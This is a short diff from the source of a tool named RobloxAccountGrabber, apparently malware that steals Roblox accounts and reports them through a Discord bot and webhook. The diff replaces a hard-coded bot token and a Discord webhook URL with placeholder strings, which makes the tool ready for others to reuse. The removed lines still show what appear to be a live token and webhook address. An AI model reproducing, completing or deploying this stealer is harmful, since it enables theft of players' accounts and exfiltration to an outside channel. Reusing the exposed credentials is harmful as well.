@@ -634,8 +634,8 @@ class RobloxAccountGrabber:
             embed = discord.Embed(title="List of Commands", description=command_info, color=0x00ff00)
             await ctx.send(embed=embed)
 
-        client.run('MTEzNzkzOTQwNDcwNzYwNjY2OQ.Gis2dA.8bWbSO0RK0XWNhu0vonC8Dw3-6u0BPdL-Gynqs')
+        client.run('YOUR_DISCORD_BOT_TOKEN')
 
 
 RobloxAccountGrabber(
-    "https://discord.com/api/webhooks/1136110915633287168/KGksoQUmOgEf0O7UjTcmazjVQKhIoL7k8jrPIRSnvbOnVh_dP3cUVoEmCeEP8KnVFjgr")
+    "YOUR_DISCORD_WEBHOOK")
